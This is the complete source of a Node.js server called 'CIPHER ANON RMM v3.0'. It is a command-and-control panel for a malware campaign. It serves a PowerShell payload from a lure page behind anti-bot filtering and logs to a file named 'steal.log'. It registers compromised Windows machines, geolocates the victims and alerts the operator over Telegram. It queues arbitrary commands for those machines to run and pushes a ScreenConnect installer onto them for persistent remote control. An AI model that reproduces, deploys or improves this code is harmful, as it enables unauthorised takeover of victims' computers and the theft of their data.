// ============================================================
// SERVER.JS — CIPHER ANON RMM v3.0
// ScreenConnect Deployment + File Upload + RMM API
// ============================================================

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const session = require('express-session');
const multer = require('multer');
const { antiBot, handleVerify } = require('./anti-bot.js');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// CONFIGURATION
// ============================================================

const CONFIG_FILE = path.join(__dirname, 'config.json');

function generateValidKey() {
    return crypto.randomBytes(32).toString('hex');
}

function loadConfig() {
    const envConfig = {
        DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME || 'admin',
        DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD || 'SecurePass123',
        ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || generateValidKey(),
        TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
        TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '',
        SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
        BASE_URL: process.env.BASE_URL || `https://${process.env.RAILWAY_STATIC_URL || 'localhost:' + PORT}`,
        RMM_POLL_INTERVAL: parseInt(process.env.RMM_POLL_INTERVAL) || 30000,
        RMM_ENABLED: process.env.RMM_ENABLED !== 'false',
        SCREENCONNECT_URL: process.env.SCREENCONNECT_URL || '',
        SCREENCONNECT_VIEWER_URL: process.env.SCREENCONNECT_VIEWER_URL || '',
        SCREENCONNECT_FILENAME: process.env.SCREENCONNECT_FILENAME || '',
    };

    let fileConfig = {};
    if (fs.existsSync(CONFIG_FILE)) {
        try {
            fileConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
        } catch (e) {}
    }

    const merged = { ...fileConfig, ...envConfig };
    const key = merged.ENCRYPTION_KEY;
    if (typeof key !== 'string' || key.length !== 64 || !/^[a-f0-9]{64}$/i.test(key)) {
        merged.ENCRYPTION_KEY = generateValidKey();
    }

    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2));
    } catch (e) {}

    return merged;
}

const CONFIG = loadConfig();

console.log(`[+] BASE_URL: ${CONFIG.BASE_URL}`);
console.log(`[+] RMM Poll Interval: ${CONFIG.RMM_POLL_INTERVAL}ms`);
console.log(`[+] RMM Enabled: ${CONFIG.RMM_ENABLED}`);
console.log(`[+] ScreenConnect URL: ${CONFIG.SCREENCONNECT_URL}`);

// ============================================================
// DATA FILES
// ============================================================

const VISITS_FILE = path.join(__dirname, 'visits.enc');
const RMM_CLIENTS_FILE = path.join(__dirname, 'rmm_clients.enc');
const LOG_FILE = path.join(__dirname, 'steal.log');

// ============================================================
// SESSION
// ============================================================

const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const SESSION_MAX_AGE = 30 * 60 * 1000;

app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false,
        maxAge: SESSION_MAX_AGE,
        httpOnly: true,
        sameSite: 'lax'
    }
}));

app.use((req, res, next) => {
    if (req.session && req.session.authenticated) {
        const now = Date.now();
        const lastActivity = req.session.lastActivity || now;
        if (now - lastActivity > SESSION_MAX_AGE) {
            req.session.destroy(() => {
                if (req.path.startsWith('/api')) {
                    return res.status(401).json({ status: 'error', message: 'Session expired' });
                }
                res.redirect('/login');
            });
            return;
        }
        req.session.lastActivity = now;
    }
    next();
});

// ============================================================
// ENCRYPTION
// ============================================================

function encryptData(data) {
    const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    const encrypted = Buffer.concat([cipher.update(JSON.stringify(data)), cipher.final()]);
    const tag = cipher.getAuthTag();
    return Buffer.concat([iv, tag, encrypted]).toString('base64');
}

function decryptData(encryptedBase64) {
    try {
        const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
        const buffer = Buffer.from(encryptedBase64, 'base64');
        const iv = buffer.subarray(0, 16);
        const tag = buffer.subarray(16, 32);
        const encrypted = buffer.subarray(32);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);
        const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
        return JSON.parse(decrypted.toString());
    } catch (e) {
        return null;
    }
}

function saveData(file, data) {
    fs.writeFileSync(file, encryptData(data));
}

function loadData(file) {
    if (!fs.existsSync(file)) return [];
    try {
        const decrypted = decryptData(fs.readFileSync(file, 'utf8'));
        return decrypted || [];
    } catch (e) {
        return [];
    }
}

function saveVisits(data) {
    fs.writeFileSync(VISITS_FILE, encryptData(data));
}

function loadVisits() {
    if (!fs.existsSync(VISITS_FILE)) {
        return { totalVisits: 0, homeVisits: 0, rmmInstalls: 0, lastVisit: null };
    }
    try {
        const decrypted = decryptData(fs.readFileSync(VISITS_FILE, 'utf8'));
        return decrypted || { totalVisits: 0, homeVisits: 0, rmmInstalls: 0, lastVisit: null };
    } catch (e) {
        return { totalVisits: 0, homeVisits: 0, rmmInstalls: 0, lastVisit: null };
    }
}

function loadRmmClients() {
    if (!fs.existsSync(RMM_CLIENTS_FILE)) return [];
    try {
        const decrypted = decryptData(fs.readFileSync(RMM_CLIENTS_FILE, 'utf8'));
        return decrypted || [];
    } catch (e) {
        return [];
    }
}

function saveRmmClients(clients) {
    saveData(RMM_CLIENTS_FILE, clients);
}

let visitsData = loadVisits();
let rmmClients = loadRmmClients();

// ============================================================
// HELPERS
// ============================================================

function getRealIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0];
    }
    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp;
    return req.connection.remoteAddress;
}

function log(msg) {
    const entry = `[${new Date().toISOString()}] ${msg}`;
    console.log(entry);
    try { fs.appendFileSync(LOG_FILE, entry + '\n'); } catch (e) {}
}

function requireAuth(req, res, next) {
    if (req.session && req.session.authenticated === true) {
        return next();
    }
    if (req.path.startsWith('/api')) {
        return res.status(401).json({ status: 'error', message: 'Unauthorized' });
    }
    res.redirect('/login');
}

function generateUniqueId() {
    return crypto.randomBytes(8).toString('hex');
}

async function getCountryInfo(ip) {
    try {
        const response = await axios.get('http://ip-api.com/json/' + ip, { timeout: 5000 });
        const data = response.data;
        if (data.status === 'success') {
            return {
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                city: data.city,
                isp: data.isp,
                lat: data.lat,
                lon: data.lon
            };
        }
        return null;
    } catch (error) {
        return null;
    }
}

function getFlagEmoji(countryCode) {
    if (!countryCode) return '🌍';
    try {
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
        return String.fromCodePoint(...codePoints);
    } catch {
        return '🌍';
    }
}

// ============================================================
// VISITOR TRACKING
// ============================================================

function trackVisit(type, req) {
    const ip = getRealIp(req);
    visitsData.totalVisits = (visitsData.totalVisits || 0) + 1;
    visitsData.lastVisit = new Date().toISOString();
    if (type === 'home') {
        visitsData.homeVisits = (visitsData.homeVisits || 0) + 1;
    } else if (type === 'rmm') {
        visitsData.rmmInstalls = (visitsData.rmmInstalls || 0) + 1;
    }
    saveVisits(visitsData);
}

// ============================================================
// ANTI-BOT & MIDDLEWARE
// ============================================================

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.set('trust proxy', true);
app.use(antiBot({ STRENGTH: 'high', RATE_LIMIT_MAX: 10, ALLOWED_IPS: [] }));
app.post('/__verify', express.json(), handleVerify);

app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    if (req.path.endsWith('.html')) {
        return res.status(404).send('Not Found');
    }
    next();
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/ping', (req, res) => {
    res.send('pong');
});

// ============================================================
// FILE UPLOAD — SCREENCONNECT MSI
// ============================================================

const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        const uploadDir = path.join(__dirname, 'public', 'uploads');
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
        cb(null, uploadDir);
    },
    filename: function(req, file, cb) {
        const ext = path.extname(file.originalname);
        const baseName = 'screenconnect-installer';
        cb(null, baseName + ext);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 },
    fileFilter: function(req, file, cb) {
        const allowedTypes = ['.msi', '.exe', '.zip'];
        const ext = path.extname(file.originalname).toLowerCase();
        if (allowedTypes.includes(ext)) {
            cb(null, true);
        } else {
            cb(new Error('Only .msi, .exe, and .zip files are allowed'));
        }
    }
});

app.post('/api/upload/screenconnect', requireAuth, upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ status: 'error', message: 'No file uploaded' });
        }

        const fileUrl = `${CONFIG.BASE_URL}/uploads/${req.file.filename}`;
        CONFIG.SCREENCONNECT_URL = fileUrl;
        CONFIG.SCREENCONNECT_FILENAME = req.file.filename;
        try {
            fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
        } catch (e) {}

        log(`[+] ScreenConnect installer uploaded: ${req.file.filename}`);
        res.json({
            status: 'ok',
            message: 'File uploaded successfully',
            fileUrl: fileUrl,
            filename: req.file.filename
        });
    } catch (e) {
        log(`[!] Upload failed: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

app.get('/api/config/screenconnect/file', requireAuth, (req, res) => {
    const filename = CONFIG.SCREENCONNECT_FILENAME || null;
    const fileUrl = CONFIG.SCREENCONNECT_URL || null;
    const fileExists = filename ? fs.existsSync(path.join(__dirname, 'public', 'uploads', filename)) : false;
    res.json({
        filename: filename,
        fileUrl: fileUrl,
        fileExists: fileExists,
        hasFile: fileExists && filename !== null
    });
});

app.delete('/api/upload/screenconnect', requireAuth, (req, res) => {
    try {
        const filename = CONFIG.SCREENCONNECT_FILENAME;
        if (!filename) {
            return res.status(404).json({ status: 'error', message: 'No file uploaded' });
        }

        const filePath = path.join(__dirname, 'public', 'uploads', filename);
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            log(`[+] Deleted uploaded file: ${filename}`);
        }

        CONFIG.SCREENCONNECT_URL = '';
        CONFIG.SCREENCONNECT_FILENAME = '';
        try {
            fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
        } catch (e) {}

        res.json({ status: 'ok', message: 'File deleted' });
    } catch (e) {
        res.status(500).json({ status: 'error', message: e.message });
    }
});

app.get('/uploads/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'uploads', req.params.filename);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send('File not found');
    }
});

// ============================================================
// TELEGRAM
// ============================================================

async function sendRmmTelegram(pcName, ip, countryInfo) {
    if (!CONFIG.SEND_NOTIFICATIONS) return;
    const t = CONFIG.TELEGRAM_BOT_TOKEN;
    const c = CONFIG.TELEGRAM_CHAT_ID;
    if (!t || t === '') return;

    const flag = countryInfo?.countryCode ? getFlagEmoji(countryInfo.countryCode) : '🌍';
    const countryName = countryInfo?.country || 'Unknown';
    const city = countryInfo?.city || 'N/A';
    const time = new Date().toLocaleString();

    const message = `📡 *New RMM Client Connected!*

🖥️ *PC:* ${pcName}
👤 *IP:* ${ip}
${flag} *Country:* ${countryName}
🏙️ *City:* ${city}
🕐 *Time:* ${time}

📊 *Dashboard:* ${CONFIG.BASE_URL}/dashboard
💻 *RMM Panel:* ${CONFIG.BASE_URL}/dashboard#rmm`;

    try {
        await axios.post(`https://api.telegram.org/bot${t}/sendMessage`, {
            chat_id: c,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }, { timeout: 10000 });
        log('[+] RMM Telegram notification sent');
    } catch (e) {
        log(`[!] RMM Telegram failed: ${e.message}`);
    }
}

// ============================================================
// AUTH ROUTES
// ============================================================

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'Username and password required' });
    }
    if (username === CONFIG.DASHBOARD_USERNAME && password === CONFIG.DASHBOARD_PASSWORD) {
        req.session.authenticated = true;
        req.session.username = username;
        req.session.lastActivity = Date.now();
        req.session.save();
        log(`[+] User logged in: ${username}`);
        return res.json({ status: 'ok', message: 'Login successful', redirect: '/dashboard' });
    }
    log(`[!] Failed login: ${username}`);
    res.status(401).json({ status: 'error', message: 'Invalid username or password' });
});

app.get('/logout', (req, res) => {
    req.session.destroy((err) => {
        res.clearCookie('connect.sid');
        res.redirect('/login');
    });
});

app.get('/api/logout', (req, res) => {
    req.session.destroy((err) => {
        res.clearCookie('connect.sid');
        res.redirect('/login');
    });
});

// ============================================================
// VISITS API
// ============================================================

app.get('/api/visits', requireAuth, (req, res) => {
    res.json(visitsData);
});

// ============================================================
// CHANGE PASSWORD
// ============================================================

app.post('/api/change-password', requireAuth, (req, res) => {
    const { oldPassword, newPassword } = req.body;
    if (!oldPassword || !newPassword) {
        return res.status(400).json({ status: 'error', message: 'Old and new password required' });
    }
    if (newPassword.length < 4) {
        return res.status(400).json({ status: 'error', message: 'New password must be at least 4 characters' });
    }
    if (oldPassword !== CONFIG.DASHBOARD_PASSWORD) {
        return res.status(401).json({ status: 'error', message: 'Current password is incorrect' });
    }
    CONFIG.DASHBOARD_PASSWORD = newPassword;
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
    } catch (e) {}
    log('[+] Password changed successfully');
    req.session.destroy((err) => {
        res.clearCookie('connect.sid');
        res.json({ status: 'ok', message: 'Password updated', redirect: '/password-success' });
    });
});

// ============================================================
// TELEGRAM CONFIG
// ============================================================

app.get('/api/config/telegram', requireAuth, (req, res) => {
    res.json({
        botToken: CONFIG.TELEGRAM_BOT_TOKEN || '',
        chatId: CONFIG.TELEGRAM_CHAT_ID || '',
        notifications: CONFIG.SEND_NOTIFICATIONS !== undefined ? CONFIG.SEND_NOTIFICATIONS : true
    });
});

app.post('/api/config/telegram', requireAuth, (req, res) => {
    const { botToken, chatId, notifications } = req.body;
    if (!botToken || !chatId) {
        return res.status(400).json({ status: 'error', message: 'Bot token and chat ID required' });
    }
    CONFIG.TELEGRAM_BOT_TOKEN = botToken;
    CONFIG.TELEGRAM_CHAT_ID = chatId;
    CONFIG.SEND_NOTIFICATIONS = notifications !== undefined ? notifications : true;
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
    } catch (e) {}
    log('[+] Telegram config updated');
    res.json({ status: 'ok', message: 'Telegram settings updated' });
});

// ============================================================
// SCREENCONNECT VIEWER URL CONFIG
// ============================================================

app.get('/api/config/screenconnect/viewer', requireAuth, (req, res) => {
    res.json({ viewerUrl: CONFIG.SCREENCONNECT_VIEWER_URL || '' });
});

app.post('/api/config/screenconnect/viewer', requireAuth, (req, res) => {
    const { viewerUrl } = req.body;
    if (!viewerUrl) {
        return res.status(400).json({ status: 'error', message: 'Viewer URL required' });
    }
    CONFIG.SCREENCONNECT_VIEWER_URL = viewerUrl;
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
    } catch (e) {}
    log('[+] ScreenConnect viewer URL updated');
    res.json({ status: 'ok', message: 'Viewer URL updated' });
});

// ============================================================
// RMM MODULE
// ============================================================

app.post('/api/rmm/report', async (req, res) => {
    try {
        if (!CONFIG.RMM_ENABLED) {
            return res.status(403).json({ status: 'error', message: 'RMM disabled' });
        }

        const data = req.body;
        const realIp = getRealIp(req);
        const countryInfo = await getCountryInfo(realIp);

        let clientId = data.clientId;
        if (!clientId) {
            clientId = generateUniqueId();
        }

        const existing = rmmClients.find(c => c.clientId === clientId);

        const client = {
            clientId: clientId,
            pcName: data.pcName || 'Unknown',
            username: data.username || 'Unknown',
            os: data.os || 'Unknown',
            ip: realIp,
            country: countryInfo?.country || data.country || 'Unknown',
            countryCode: countryInfo?.countryCode || data.countryCode || 'XX',
            city: countryInfo?.city || data.city || 'N/A',
            isp: countryInfo?.isp || data.isp || 'N/A',
            rmmInstalled: data.rmmInstalled || false,
            rmmType: data.rmmType || 'CipherAnon',
            screenconnectId: data.screenconnectId || null,
            screenconnectServerUrl: data.screenconnectServerUrl || null,
            status: 'online',
            lastSeen: new Date().toISOString(),
            firstSeen: existing?.firstSeen || new Date().toISOString(),
            commands: existing?.commands || [],
            source: data.source || 'payload',
        };

        const index = rmmClients.findIndex(c => c.clientId === clientId);
        if (index !== -1) {
            rmmClients[index] = { ...rmmClients[index], ...client };
        } else {
            rmmClients.push(client);
            await sendRmmTelegram(client.pcName, realIp, countryInfo);
        }

        saveRmmClients(rmmClients);
        log(`[RMM] Report from ${client.pcName} (${clientId}) — ${client.rmmInstalled ? 'RMM Installed' : 'Agent Connected'}`);

        const pendingCommands = client.commands || [];
        if (pendingCommands.length > 0) {
            const nextCommand = pendingCommands[0];
            return res.json({ status: 'ok', command: nextCommand });
        }

        res.json({ status: 'ok' });
    } catch (e) {
        log(`[!] RMM report error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

app.get('/api/rmm/clients', requireAuth, (req, res) => {
    const now = Date.now();
    const timeout = CONFIG.RMM_POLL_INTERVAL * 2;

    rmmClients.forEach(c => {
        const lastSeen = new Date(c.lastSeen).getTime();
        c.status = (now - lastSeen) < timeout ? 'online' : 'offline';
    });

    saveRmmClients(rmmClients);
    res.json(rmmClients);
});

app.get('/api/rmm/client/:clientId', requireAuth, (req, res) => {
    const client = rmmClients.find(c => c.clientId === req.params.clientId);
    if (!client) {
        return res.status(404).json({ status: 'error', message: 'Client not found' });
    }
    const now = Date.now();
    const timeout = CONFIG.RMM_POLL_INTERVAL * 2;
    client.status = (now - new Date(client.lastSeen).getTime()) < timeout ? 'online' : 'offline';
    res.json(client);
});

app.get('/api/rmm/commands/:clientId', (req, res) => {
    const client = rmmClients.find(c => c.clientId === req.params.clientId);
    if (!client) {
        return res.status(404).json({ status: 'error', message: 'Client not found' });
    }

    const commands = client.commands || [];
    if (commands.length > 0) {
        const nextCommand = commands[0];
        return res.json(nextCommand);
    }

    res.json(null);
});

app.post('/api/rmm/command/:clientId', requireAuth, (req, res) => {
    const { command, args } = req.body;
    if (!command) {
        return res.status(400).json({ status: 'error', message: 'Command required' });
    }

    const client = rmmClients.find(c => c.clientId === req.params.clientId);
    if (!client) {
        return res.status(404).json({ status: 'error', message: 'Client not found' });
    }

    if (!client.commands) client.commands = [];
    const commandId = generateUniqueId();
    client.commands.push({
        id: commandId,
        command: command,
        args: args || '',
        issuedAt: new Date().toISOString(),
        status: 'pending'
    });

    saveRmmClients(rmmClients);
    log(`[RMM] Command sent to ${client.pcName}: ${command}`);
    res.json({ status: 'ok', commandId: commandId });
});

app.post('/api/rmm/response/:clientId', (req, res) => {
    const client = rmmClients.find(c => c.clientId === req.params.clientId);
    if (!client) {
        return res.status(404).json({ status: 'error', message: 'Client not found' });
    }

    const { commandId, success, result } = req.body;

    if (client.commands) {
        const cmdIndex = client.commands.findIndex(c => c.id === commandId);
        if (cmdIndex !== -1) {
            client.commands[cmdIndex].status = success ? 'completed' : 'failed';
            client.commands[cmdIndex].result = result || '';
            client.commands[cmdIndex].completedAt = new Date().toISOString();
            log(`[RMM] Command ${commandId} on ${client.pcName}: ${success ? 'SUCCESS' : 'FAILED'}`);
        }
    }

    if (result && result.includes('ScreenConnect')) {
        client.rmmType = 'ScreenConnect';
        client.rmmInstalled = true;
        const match = result.match(/Client ID: (\S+)/);
        if (match) {
            client.screenconnectId = match[1];
        }
        // Try to extract server URL from result
        const serverMatch = result.match(/Server URL: (\S+)/);
        if (serverMatch) {
            client.screenconnectServerUrl = serverMatch[1];
        }
    }

    saveRmmClients(rmmClients);
    res.json({ status: 'ok' });
});

app.post('/api/rmm/move/:clientId', requireAuth, (req, res) => {
    const client = rmmClients.find(c => c.clientId === req.params.clientId);
    if (!client) {
        return res.status(404).json({ status: 'error', message: 'Client not found' });
    }

    const commandId = generateUniqueId();
    if (!client.commands) client.commands = [];
    client.commands.push({
        id: commandId,
        command: 'install-screenconnect',
        args: '',
        issuedAt: new Date().toISOString(),
        status: 'pending',
        moveTarget: 'ScreenConnect'
    });

    saveRmmClients(rmmClients);
    log(`[RMM] Move command sent to ${client.pcName}: ScreenConnect`);
    res.json({ status: 'ok', commandId: commandId, message: 'Moving to ScreenConnect' });
});

app.post('/api/rmm/uninstall/:clientId', requireAuth, (req, res) => {
    const client = rmmClients.find(c => c.clientId === req.params.clientId);
    if (!client) {
        return res.status(404).json({ status: 'error', message: 'Client not found' });
    }

    const commandId = generateUniqueId();
    if (!client.commands) client.commands = [];
    client.commands.push({
        id: commandId,
        command: 'uninstall-rmm',
        args: '',
        issuedAt: new Date().toISOString(),
        status: 'pending'
    });

    saveRmmClients(rmmClients);
    log(`[RMM] Uninstall command sent to ${client.pcName}`);
    res.json({ status: 'ok', commandId: commandId, message: 'Uninstall command sent' });
});

app.delete('/api/rmm/delete/:clientId', requireAuth, (req, res) => {
    const index = rmmClients.findIndex(c => c.clientId === req.params.clientId);
    if (index === -1) {
        return res.status(404).json({ status: 'error', message: 'Client not found' });
    }
    const removed = rmmClients.splice(index, 1)[0];
    saveRmmClients(rmmClients);
    log(`[RMM] Deleted client: ${removed.pcName}`);
    res.json({ status: 'ok', deleted: removed });
});

app.get('/api/rmm/stats', requireAuth, (req, res) => {
    const now = Date.now();
    const timeout = CONFIG.RMM_POLL_INTERVAL * 2;
    let online = 0, offline = 0, total = rmmClients.length;

    rmmClients.forEach(c => {
        const lastSeen = new Date(c.lastSeen).getTime();
        if ((now - lastSeen) < timeout) {
            online++;
        } else {
            offline++;
        }
    });

    res.json({ total, online, offline });
});

// ============================================================
// SERVE STATIC FILES
// ============================================================

function getBaseUrl() {
    return CONFIG.BASE_URL || `https://${process.env.RAILWAY_STATIC_URL || 'localhost:' + PORT}`;
}

function injectBaseUrl(content) {
    const baseUrl = getBaseUrl();
    const screenconnectUrl = CONFIG.SCREENCONNECT_URL || '';
    let result = content;
    result = result.replace(/\{\{BASE_URL\}\}/g, baseUrl);
    result = result.replace(/\{\{SCREENCONNECT_URL\}\}/g, screenconnectUrl);
    return result;
}

app.get('/payload.ps1', (req, res) => {
    trackVisit('rmm', req);
    try {
        let script = fs.readFileSync(path.join(__dirname, 'public', 'payload.ps1'), 'utf8');
        script = script.replace(/\{\{BASE_URL\}\}/g, getBaseUrl());
        script = script.replace(/\{\{SCREENCONNECT_URL\}\}/g, CONFIG.SCREENCONNECT_URL || '');
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.send(script);
    } catch (e) {
        res.status(500).send('Error loading payload');
    }
});

app.get('/rmm-uninstall.ps1', (req, res) => {
    try {
        let script = fs.readFileSync(path.join(__dirname, 'public', 'rmm-uninstall.ps1'), 'utf8');
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.send(script);
    } catch (e) {
        res.status(500).send('Error loading uninstaller');
    }
});

app.get('/home', (req, res) => {
    trackVisit('home', req);
    try {
        let html = fs.readFileSync(path.join(__dirname, 'public', 'home.php'), 'utf8');
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.send(injectBaseUrl(html));
    } catch (e) {
        res.status(500).send('Error loading page');
    }
});

app.get('/dashboard', requireAuth, (req, res) => {
    try {
        let html = fs.readFileSync(path.join(__dirname, 'public', 'dashboard.php'), 'utf8');
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.send(injectBaseUrl(html));
    } catch (e) {
        res.status(500).send('Error loading dashboard');
    }
});

app.get('/login', (req, res) => {
    if (req.session && req.session.authenticated) {
        return res.redirect('/dashboard');
    }
    try {
        let html = fs.readFileSync(path.join(__dirname, 'public', 'login.php'), 'utf8');
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.send(injectBaseUrl(html));
    } catch (e) {
        res.status(500).send('Error loading login');
    }
});

app.get('/password-success', requireAuth, (req, res) => {
    try {
        let html = fs.readFileSync(path.join(__dirname, 'public', 'password-success.php'), 'utf8');
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.send(injectBaseUrl(html));
    } catch (e) {
        res.status(500).send('Error loading page');
    }
});

app.get('/home.php', (req, res) => { res.redirect('/home'); });
app.get('/login.php', (req, res) => {
    if (req.session && req.session.authenticated) {
        return res.redirect('/dashboard');
    }
    res.redirect('/login');
});
app.get('/dashboard.php', requireAuth, (req, res) => { res.redirect('/dashboard'); });
app.get('/password-success.php', requireAuth, (req, res) => { res.redirect('/password-success'); });

app.get('*.php', (req, res, next) => {
    const filePath = path.join(__dirname, 'public', req.path);
    const publicPhp = ['/login.php', '/home.php'];

    if (publicPhp.includes(req.path)) {
        if (fs.existsSync(filePath)) {
            try {
                let html = fs.readFileSync(filePath, 'utf8');
                res.setHeader('Content-Type', 'text/html; charset=utf-8');
                res.send(injectBaseUrl(html));
                return;
            } catch (e) { return next(); }
        }
        return next();
    }

    if (!req.session || !req.session.authenticated) {
        return res.redirect('/login');
    }

    if (fs.existsSync(filePath)) {
        try {
            let html = fs.readFileSync(filePath, 'utf8');
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            res.send(injectBaseUrl(html));
        } catch (e) { next(); }
    } else {
        next();
    }
});

app.use((req, res, next) => {
    const filePath = path.join(__dirname, 'public', req.path);
    if (fs.existsSync(filePath) && !req.path.startsWith('/api')) {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        return res.sendFile(filePath);
    }
    next();
});

app.use((req, res) => {
    if (req.path.startsWith('/api')) {
        res.status(404).json({ status: 'error', message: 'API endpoint not found' });
    } else {
        res.status(404).send('Not Found');
    }
});

app.use((err, req, res, next) => {
    console.error('[!] Error:', err.message);
    if (req.path.startsWith('/api')) {
        res.status(500).json({ status: 'error', message: err.message || 'Internal Server Error' });
    } else {
        res.status(500).send('Internal Server Error');
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(55));
    console.log('  📡 CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY');
    console.log('='.repeat(55));
    console.log(`  [+] Server: http://localhost:${PORT}`);
    console.log(`  [+] BASE_URL: ${CONFIG.BASE_URL}`);
    console.log(`  [+] Login: ${CONFIG.BASE_URL}/login`);
    console.log(`  [+] Home: ${CONFIG.BASE_URL}/home`);
    console.log(`  [+] Dashboard: ${CONFIG.BASE_URL}/dashboard`);
    console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
    console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
    console.log(`  [+] RMM Enabled: ${CONFIG.RMM_ENABLED ? '✅' : '❌'}`);
    console.log(`  [+] RMM Poll Interval: ${CONFIG.RMM_POLL_INTERVAL}ms`);
    console.log(`  [+] ScreenConnect URL: ${CONFIG.SCREENCONNECT_URL}`);
    console.log(`  [+] ScreenConnect Viewer: ${CONFIG.SCREENCONNECT_VIEWER_URL}`);
    console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? '✅' : '❌'}`);
    console.log('='.repeat(55) + '\n');
});

process.on('SIGINT', () => {
    console.log('\n[!] Saving data...');
    saveVisits(visitsData);
    saveRmmClients(rmmClients);
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n[!] Saving data...');
    saveVisits(visitsData);
    saveRmmClients(rmmClients);
    process.exit(0);
});

module.exports = app;
